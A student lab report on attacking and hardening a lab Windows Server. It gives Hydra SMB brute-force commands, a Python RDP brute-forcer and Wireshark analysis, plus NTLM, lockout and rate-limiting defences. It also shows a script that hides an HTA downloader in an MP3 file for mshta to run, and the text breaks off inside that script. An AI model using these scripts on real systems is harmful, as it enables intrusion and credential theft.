<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"}>
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />

    <meta name="description" content="Security test of Windows Server">

    
        <title>Security test of Windows Server | Silly blog</title>
    

    
    <style>
        :root {
          --background: #ffffff;
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --background: #1b1b1b;
          }
        }
        html {
            background-color: var(--background);
        }
        body {
            background-color: var(--background);
        }
    </style>

    
    <link rel="stylesheet" type="text/css" href="/style.min.a9de976a7573ba1b8227e403bbfab145eef224a3b71a621553428985cf42623c.css" media="all">

    
    

  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">About</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">Posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/">root</a></li>
            
          </ul>
        </nav>
        




<div id="single-header">
  <h1>
    Security test of Windows Server
  </h1>
  <div id="single-meta">
    
      

  </div>
</div>





<main><blockquote>
<p>Note: this was converted using from LaTeX to Markdown using Chat GPT 4.1 the original pdf can be found <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex9/Sicherheitstests%20von%20Windows%20Server.pdf"  target="_blank" rel="noreferrer nofollow">here</a> along with the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex9/zotero.bib"  target="_blank" rel="noreferrer nofollow">bibliography</a></p></blockquote>
<hr>
<h1 id="testing-windows-server-security">Testing Windows server security</h1>
<hr>
<p><strong>Laboratory protocol</strong><br>
Exercise 9: Testing Windows server security<br>
<figure><img src="/itsi/y3/ex9/images/menthing.png"><figcaption>
      <h4>Figure: Grouplogo</h4>
    </figcaption>
</figure>

<strong>Subject:</strong> ITSI<br>
<strong>Class:</strong> 3AHITN<br>
<strong>Name:</strong> Stefan FÃ¼rst, Justin Tremurici<br>
<strong>Group Name/Number:</strong> Name here/12<br>
<strong>Supervisor:</strong> SPAC, ZIVK<br>
<strong>Exercise dates:</strong> 14.03.2025 | 21.03.2025 | 28.03.2025 | 04.04.2025<br>
<strong>Submission date:</strong> 11.04.2025</p>
<hr>
<h2 id="table-of-contents">Table of Contents</h2>
<ul>
<li><a href="#task-definition" >Task definition</a></li>
<li><a href="#summary" >Summary</a></li>
<li><a href="#complete-network-topology-of-the-exercise" >Complete network topology of the exercise</a></li>
<li><a href="#exercise-execution" >Exercise Execution</a></li>
<li><a href="#references" >References</a></li>
</ul>
<hr>
<h2 id="task-definition">Task definition</h2>
<p>This task was conducted using a combination of manual configuration and automated attack tools to evaluate the security posture of a Windows Server environment. The environment setup involved preparing both the target system and an attacker system running Kali Linux, which was equipped with tools such as Hydra for brute-force attacks and Wireshark for network traffic analysis.</p>
<p>Initially, the target Windows Server was configured by creating a new local user account named <code>testuser</code> with the password <code>passwort</code>. A network share was created using <code>New-SmbShare</code>, and permissions were assigned to <code>testuser</code> to grant access. Concurrently, Wireshark was deployed on either the server or an intermediary device to capture and analyze traffic related to the attacks.</p>
<p>To simulate credential-based attacks, Hydra was used to conduct brute-force attempts on the SMB protocol:</p>
<pre tabindex="0"><code>hydra -l testuser -P /path/to/passwordlist.txt smb://&lt;IP-ADDRESS&gt;
</code></pre><p>The time to successful login was measured and compared between weak (e.g., <code>passwort</code>) and strong (e.g., <code>P@ssw0rd123!</code>) password configurations. Network traffic was captured and filtered using the expression <code>tcp.port == 445</code>, enabling detailed inspection of failed and successful authentication attempts.</p>
<p>A second brute-force attack was executed against the Remote Desktop Protocol (RDP). RDP was enabled through system settings, and <code>testuser</code> was added to the <code>Remote Desktop Users</code> group. Hydra was again utilized for this. Wireshark was used to capture the RDP traffic (<code>tcp.port == 3389</code>) for comparison against the SMB-based attack. Observations highlighted protocol-level differences in how failed and successful login attempts were processed and exposed.</p>
<p>Following the attacks, two mitigation techniques were researched and implemented to harden the system. Group Policy Objects (GPOs) were configured to enforce account lockout policies and limit RDP access. These changes were validated by re-running attacks and observing reduced effectiveness due to increased security controls.</p>
<p>Additionally, privilege escalation techniques were examined using Mimikatz. Requirements for successful execution were researched, including necessary privileges and system policies. As a bonus, Mimikatz was tested on the server to extract credentials and security tokens. The analysis revealed sensitive credential information, underscoring the importance of disabling credential caching and applying strict administrative controls.</p>
<hr>
<h2 id="summary">Summary</h2>
<p>In this exercise, we used <code>Hydra</code> for brute-force attacks on various services. However, due to issues with Hydra&rsquo;s support for RDP brute-forcing, we created a custom Python script that utilized the <code>FreeRDP</code> command to perform the RDP brute-force attacks. This solution allowed us to bypass the limitations of Hydra and simulate RDP credential stuffing attacks effectively.</p>
<p>To enhance the security of the target system, we adjusted Group Policy settings, specifically disabling <code>NTLM</code> authentication and modifying account lockout policies. These changes were intended to limit the success of brute-force attacks by reducing the number of login attempts allowed.</p>
<p>We also deployed <code>EvWatcher</code> to monitor and limit attack attempts, ensuring that further malicious actions would be detected and blocked. For privilege escalation, we used <code>MSHTA</code> in combination with an MP3 file to bypass security and deploy <code>Mimikatz</code> onto the target system. To ensure <code>Mimikatz</code> could function, we disabled Windows Defender.</p>
<p><code>Mimikatz</code> is a powerful tool used to extract credentials, manipulate security tokens, and perform privilege escalation on Windows systems. It can dump plaintext passwords, password hashes, and Kerberos tickets from memory, providing an attacker with sensitive information. This exercise highlighted the importance of securing systems against such attacks by using strong policies, disabling insecure protocols like <code>NTLM</code>, and employing endpoint protection to prevent tools like <code>Mimikatz</code> from successfully exploiting the system.</p>
<hr>
<h2 id="complete-network-topology-of-the-exercise">Complete network topology of the exercise</h2>
<figure><img src="/itsi/y3/ex9/images/topo.png"><figcaption>
      <h4>Figure 1: Complete network topology of the exercise</h4>
    </figcaption>
</figure>

<hr>
<h2 id="exercise-execution">Exercise Execution</h2>
<h3 id="setting-up-the-exercise-environment">Setting Up the Exercise Environment</h3>
<p>To meet the initial requirements of this exercise, the script from last time was simplified to create only five test users, along with corresponding security groups. Most randomly generated elements were removed, leaving only three shares on the <code>C:</code> drive. This can be verified in the Computer Management utility under the Users, Shares, and Groups categories, as shown in the figures below.</p>
<p><figure><img src="/itsi/y3/ex9/images/user.png"><figcaption>
      <h4>Figure 2: Verifying the creation of the users</h4>
    </figcaption>
</figure>

<figure><img src="/itsi/y3/ex9/images/groups.png"><figcaption>
      <h4>Figure 3: Verifying the creation of the groups</h4>
    </figcaption>
</figure>

<figure><img src="/itsi/y3/ex9/images/shares.png"><figcaption>
      <h4>Figure 4: Verifying the creation of the shares</h4>
    </figcaption>
</figure>
</p>
<hr>
<h3 id="brute-forcing-smb-with-hydra">Brute-Forcing SMB with Hydra</h3>
<p>Since part of the setup involved assigning weak passwords to the users, they can be easily brute-forced with Hydra using the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>hydra -l user1 -P /usr/share/wordlists/rockyou.txt -t <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">192.168</span>.56.102 smb2 -I
</span></span></code></pre></div><p>This command consists of the <code>-l</code> flag to specify the user to target, and the <code>-P</code> flag to specify the list of passwords to useâin this case, the RockYou wordlist. Note that <code>-P</code> (uppercase) indicates a list of passwords, whereas <code>-p</code> (lowercase) is used for a single password. The <code>-t</code> flag sets the number of threads to use for the attack. <code>192.168.56.102</code> sets the target IP address, and <code>smb2</code> specifies the protocol to use. The <code>-I</code> flag tells Hydra to ignore restoring progress from an earlier session.</p>
<p>After running the command, we can see that <code>password123_</code> is not a secure password, as it gets cracked in just one second.</p>
<figure><img src="/itsi/y3/ex9/images/hydrasmb.png"><figcaption>
      <h4>Figure 5: Obtaining the password for the smb share</h4>
    </figcaption>
</figure>

<hr>
<h4 id="analyzing-network-traffic-with-wireshark">Analyzing Network Traffic with Wireshark</h4>
<p>By filtering for <code>tcp.port == 445</code>, we can examine the SMB-related network traffic being sent and received, and analyze the authentication process taking place alongside it.</p>
<ul>
<li>The first SMB packet is sent using version 1 instead of version 2, despite version 2 being specified in the command. This is explained in the SMB specification <!-- raw HTML omitted -->Microsoft Corporation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted -->.</li>
<li>The <code>Negotiate Protocol Request</code> informs the server of the SMB dialects (i.e., versions) the client supports, which is essentially an array of supported versions. <!-- raw HTML omitted -->Microsoft Community Hub<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup><!-- raw HTML omitted --></li>
</ul>
<figure><img src="/itsi/y3/ex9/images/smb1.png"><figcaption>
      <h4>Figure 6: Inspecting the first Negotiate Protocol Request</h4>
    </figcaption>
</figure>

<ul>
<li>The server responds with a <code>Negotiate Protocol Response</code>, replying with the preferred SMB dialect and an array of capabilities.</li>
</ul>
<figure><img src="/itsi/y3/ex9/images/smb2.png"><figcaption>
      <h4>Figure 7: Viewing the Negotiate Protocol Response</h4>
    </figcaption>
</figure>

<ul>
<li>The client responds with its own list of supported capabilities.</li>
</ul>
<figure><img src="/itsi/y3/ex9/images/smb3.png"><figcaption>
      <h4>Figure 8: Viewing the second Negotiate Protocol Request</h4>
    </figcaption>
</figure>

<ul>
<li>The server specifies the preferred dialect from the clientâs dialect arrayâhere, <code>SMB 3.1.1</code>.</li>
</ul>
<figure><img src="/itsi/y3/ex9/images/smb4.png"><figcaption>
      <h4>Figure 9: Viewing the second Negotiate Protocol Response</h4>
    </figcaption>
</figure>

<ul>
<li>After a dialect and capabilities have been selected, a <code>Session Setup Request</code> is sent, initiating the authentication process using the GSS-API (Generic Security Service Application Program Interface). This is used alongside NTLMSSP, which stands for NT LAN Manager Security Support Providerâa binary messaging protocol developed by Microsoft to facilitate NTLM challenge-response authentication and to negotiate integrity and confidentiality options. <!-- raw HTML omitted -->Wikipedia<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted --></li>
</ul>
<figure><img src="/itsi/y3/ex9/images/smb5.png"><figcaption>
      <h4>Figure 10: Viewing the Session Setup Request</h4>
    </figcaption>
</figure>

<ul>
<li>The server responds with <code>STATUS_MORE_PROCESSING_REQUIRED</code>, indicating that guest access is disabled and authentication is required to connect to this SMB share. <!-- raw HTML omitted -->Microsoft Docs<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup><!-- raw HTML omitted --></li>
</ul>
<figure><img src="/itsi/y3/ex9/images/smb6.png"><figcaption>
      <h4>Figure 11: Viewing the Session Setup Response</h4>
    </figcaption>
</figure>

<ul>
<li>The client sends another <code>Session Setup Request</code> with <code>NTLMSSP_AUTH</code>, including the domain name, user name, and session key.</li>
</ul>
<figure><img src="/itsi/y3/ex9/images/smb7.png"><figcaption>
      <h4>Figure 12: Viewing the second Session Setup Request</h4>
    </figcaption>
</figure>

<ul>
<li>If the authentication fails, the server responds with <code>STATUS_LOGON_FAILURE</code>.</li>
</ul>
<figure><img src="/itsi/y3/ex9/images/smb8.png"><figcaption>
      <h4>Figure 13: Viewing the second Session Setup Response</h4>
    </figcaption>
</figure>

<ul>
<li>If the authentication succeeds, the NT Status field in the header of the <code>Session Setup Response</code> is set to <code>STATUS_SUCCESS</code>. This is followed by a <code>Tree Connect Request</code> to access a share on the server. Since I did not specify a share, Hydra defaults to the administrative share <code>$IPC</code>, which is used to communicate with programs via named pipes over the network. <!-- raw HTML omitted -->Windows OS Hub<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup><!-- raw HTML omitted --></li>
</ul>
<p><figure><img src="/itsi/y3/ex9/images/smb9.png"><figcaption>
      <h4>Figure 14: Viewing the successful Session Setup Response</h4>
    </figcaption>
</figure>

<figure><img src="/itsi/y3/ex9/images/smb10.png"><figcaption>
      <h4>Figure 15: Viewing the Tree Connect Request</h4>
    </figcaption>
</figure>

<figure><img src="/itsi/y3/ex9/images/smb11.png"><figcaption>
      <h4>Figure 16: Viewing the Tree Connect Response</h4>
    </figcaption>
</figure>
</p>
<hr>
<h3 id="brute-forcing-rdp">Brute-Forcing RDP</h3>
<p><code>RDP</code> is a proprietary protocol developed by Microsoft that allows a user to connect to another computer with a graphical interface. <!-- raw HTML omitted -->Wikipedia<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><!-- raw HTML omitted --></p>
<p>However, Hydra did not detect my installation of <code>libfreerdp3</code>, so I created a custom Python RDP brute-forcing script based on the <code>xfreerdp3</code> command.</p>
<p><figure><img src="/itsi/y3/ex9/images/hydranordp.png"><figcaption>
      <h4>Figure 17: Hydra showing that it&#39;s not compiled with freerdp support</h4>
    </figcaption>
</figure>

<figure><img src="/itsi/y3/ex9/images/freerdpnonono.png"><figcaption>
      <h4>Figure 18: Showing that the libfreerdp3 package is installed but not found</h4>
    </figcaption>
</figure>
</p>
<p>Using my script, I can now obtain the credentials and generate a command to connect to the server.</p>
<figure><img src="/itsi/y3/ex9/images/rdpburteforce.png"><figcaption>
      <h4>Figure 19: Obtaining the credentials of the user</h4>
    </figcaption>
</figure>

<h4 id="explaining-my-own-rdp-brute-forcing-script">Explaining My Own RDP Brute-Forcing Script</h4>
<p>The script uses threading and the <code>xfreerdp3</code> command with <code>+auth-only</code> to check credentials. Here is an abstracted version:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess<span style="color:#f92672">,</span> threading<span style="color:#f92672">,</span> argparse<span style="color:#f92672">,</span> concurrent.futures
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>password_found <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Event()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_command</span>(host, user, port, password):
</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;xfreerdp3&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/v:</span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/u:</span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/p:</span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;+auth-only&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(cmd, capture_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, text<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result<span style="color:#f92672">.</span>returncode, result<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>strip(), result<span style="color:#f92672">.</span>stderr<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;Error&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">worker</span>(args, passwords):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> pw <span style="color:#f92672">in</span> passwords:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> password_found<span style="color:#f92672">.</span>is_set(): <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>        code, _, _ <span style="color:#f92672">=</span> run_command(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>user, args<span style="color:#f92672">.</span>port, pw)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> code <span style="color:#f92672">==</span> <span style="color:#ae81ff">131</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;SUCCESS: </span><span style="color:#e6db74">{</span>pw<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            password_found<span style="color:#f92672">.</span>set()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>, <span style="color:#e6db74">&#34;--user&#34;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ... other arguments ...</span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pwlist <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(args<span style="color:#f92672">.</span>Password_list) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f:
</span></span><span style="display:flex;"><span>            pwlist<span style="color:#f92672">.</span>append(line<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>threads <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        worker(args, pwlist)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># ...split pwlist and run with ThreadPoolExecutor...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> password_found<span style="color:#f92672">.</span>is_set():
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Password not found&#34;</span>)
</span></span></code></pre></div><hr>
<h4 id="analyzing-network-traffic-with-wireshark-1">Analyzing Network Traffic with Wireshark</h4>
<p>When inspecting the traffic of an <code>RDP</code> connection, only two RDP requests are sent: a <code>Negotiate Request</code> and a <code>Negotiate Response</code>. The server replies with the protocol to use, e.g., <code>CredSSP</code> (Credential Security Support Provider). <!-- raw HTML omitted -->Microsoft Docs<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup><!-- raw HTML omitted --></p>
<p><figure><img src="/itsi/y3/ex9/images/rdpneg%20req.png"><figcaption>
      <h4>Figure 20: Viewing the RDP Negotiate Request</h4>
    </figcaption>
</figure>

<figure><img src="/itsi/y3/ex9/images/rdp%20neg%20res.png"><figcaption>
      <h4>Figure 21: Viewing the RDP Negotiate Response</h4>
    </figcaption>
</figure>

<figure><img src="/itsi/y3/ex9/images/tlshandshake.png"><figcaption>
      <h4>Figure 22: Viewing the Handshake and Termination of the Connection</h4>
    </figcaption>
</figure>
</p>
<ul>
<li>After selecting the protocol, a TLS handshake occurs between the client and the server. During this handshake, both parties agree on the TLS version, choose a cipher suite, authenticate the serverâs identity via its public key and the digital signature of an SSL certificate authority, and generate session keys in order to use symmetric encryption after the handshake is complete. <!-- raw HTML omitted -->Cloudflare<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup><!-- raw HTML omitted --></li>
</ul>
<hr>
<h3 id="hardening-windows-against-brute-force-attacks">Hardening Windows Against Brute-Force Attacks</h3>
<h4 id="using-evlwatcher-for-rate-limiting">Using EvLWatcher for Rate Limiting</h4>
<p>To set up rate limiting, I used a <code>fail2ban</code>-style tool for Windows called EvLWatcher. After running the setup executable, no additional configuration is necessary, and it can essentially be left to run in the background. <!-- raw HTML omitted -->GitHub<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup><!-- raw HTML omitted --></p>
<figure><img src="/itsi/y3/ex9/images/evlwatcherf.png"><figcaption>
      <h4>Figure 23: Observing The Attackers IP-Address getting temporarily banned</h4>
    </figcaption>
</figure>

<h4 id="disabling-ntlm-authentication">Disabling NTLM Authentication</h4>
<p>NTLM is a legacy authentication protocol that dates back to Windows NT. Although Microsoft introduced a more secure alternative called Kerberos in 1989, NTLM is still used in some domain networks and remains enabled for backward compatibility. One of NTLM&rsquo;s major flaws is that it stores password hashes in plaintext in the memory of its servers, which can be extracted using pass-the-hash tools such as Mimikatz. <!-- raw HTML omitted -->Windows OS Hub<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup><!-- raw HTML omitted --></p>
<p><figure><img src="/itsi/y3/ex9/images/disablentlm.png"><figcaption>
      <h4>Figure 24: Disabling NTLM authentication for all accounts</h4>
    </figcaption>
</figure>

<figure><img src="/itsi/y3/ex9/images/nontlm.png"><figcaption>
      <h4>Figure 25: Hydra failing without being able to use NTLM</h4>
    </figcaption>
</figure>
</p>
<h4 id="configuring-login-timeout-settings">Configuring Login Timeout Settings</h4>
<p>To slow down RDP brute-forcing, account lockout can be configured in the Local Security Policy editor under Account Lockout Policy. <!-- raw HTML omitted -->The Windows Club<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup><!-- raw HTML omitted --></p>
<figure><img src="/itsi/y3/ex9/images/lockout.png"><figcaption>
      <h4>Figure 26: Showing the lockout policy</h4>
    </figcaption>
</figure>

<hr>
<h3 id="mimikatz-an-introduction">Mimikatz: An Introduction</h3>
<p>Mimikatz is a post-exploitation tool designed to extract credential information. <!-- raw HTML omitted -->Medium<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup><!-- raw HTML omitted --></p>
<h4 id="what-can-mimikatz-do">What Can Mimikatz Do?</h4>
<p>The main features of Mimikatz include extracting credentials from memory or disk-based password stores. This includes plaintext passwords, PINs, Kerberos tickets, and NTLM password hashes. Mimikatz achieves this through a variety of techniques, such as Pass-the-Hash, which allows attackers to use captured NTLM hashes to create new authenticated sessions on the networkâwithout needing to know the userâs actual password. <!-- raw HTML omitted -->CrowdStrike<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup><!-- raw HTML omitted --></p>
<ul>
<li><strong>Pass-the-Hash:</strong> Allows attackers to use captured NTLM hashes to create new authenticated sessions.</li>
<li><strong>Pass-the-ticket:</strong> Bypasses normal system access controls by stealing a valid Kerberos ticket.</li>
</ul>
<p>There are two notable types of forged Kerberos tickets: Silver and Golden tickets. <!-- raw HTML omitted -->Medium<sup id="fnref1:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup><!-- raw HTML omitted --> <!-- raw HTML omitted -->MITRE ATT&amp;CK<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup><!-- raw HTML omitted --></p>
<h4 id="how-to-use-mimikatz">How to Use Mimikatz</h4>
<p>There are multiple ways to invoke Mimikatz on a target system. The simplest method is to download a compiled release from the official GitHub repository. However, there are also pre-built PowerShell scripts and commands that streamline its execution, such as Invoke-Mimikatz from the PowerSploit framework. <!-- raw HTML omitted -->PowerSploit<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup><!-- raw HTML omitted --></p>
<hr>
<h3 id="running-mimikatz">Running Mimikatz</h3>
<p>To run Mimikatz on the target system, I wanted to try a unique or more creative method rather than simply downloading and executing the Mimikatz binary directly. Inspired by a video from security professional and YouTuber John Hammond, where he analyzes a malware sample hidden inside an MP3 file that uses mshta.exe to execute a payload, I explored a similar idea. <!-- raw HTML omitted -->John Hammond<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup><!-- raw HTML omitted --></p>
<p>To do this, I used an MP3 file in which I embedded the plain text of an HTA script that downloads Mimikatz. The MP3 file appears normal and can be played, but if executed using <code>mshta</code>, it executes the script.</p>
<figure><img src="/itsi/y3/ex9/images/payload.png"><figcaption>
      <h4>Figure 27: Showing the payload in the mp3 file</h4>
    </figcaption>
</figure>

<p>The payload runs a PowerShell command in a hidden window that downloads Mimikatz and saves it as <code>msedge_installer.zip</code>.</p>
<p>To insert my payload into an MP3 file, I wrote the following Python script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">insert_file</span>(target_path, payload_path, output_path):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(target_path, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> target_file:
</span></span><span style="display:flex;"><span>            target_content <span style="color:#f92672">=</span> target_file<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(payload_path, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> payload_content:
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> payload_content<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>        target_size <span style="color:#f92672">=</span> len(target_content)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> target_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Error: Target file is empty.&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>        middle_index <span style="color:#f92672">=</span> target_size <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        random_offset_range <span style="color:#f92672">=</span> target_size <span style="color:#f92672">//</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>        random_offset <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#f92672">-</span>random_offset_range, random_offset_range)
</span></span><span style="display:flex;"><span>        insertion_point <span style="color:#f92672">=</span> max(<span style="color:#ae81ff">0</span>, min(target_size, middle_index <span style="color:#f92672">+</span> random_offset))
</span></span><span style="display:flex;"><span>        new_content <span style="color:#f92672">=</span> target_content[:insertion_point] <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> target_content[insertion_point:]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(output_path, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> output_file:
</span></span><span style="display:flex;"><span>            output_file<span style="color:#f92672">.</span>write(new_content)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;File &#39;</span><span style="color:#e6db74">{</span>payload_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; inserted at position </span><span style="color:#e6db74">{</span>insertion_point<span style="color:#e6db74">}</span><span style="color:#e6db74"> in &#39;</span><span style="color:#e6db74">{</span>target_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and saved as &#39;</span><span style="color:#e6db74">{</span>output_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;.&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Error: One or both of the input files were not found.&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
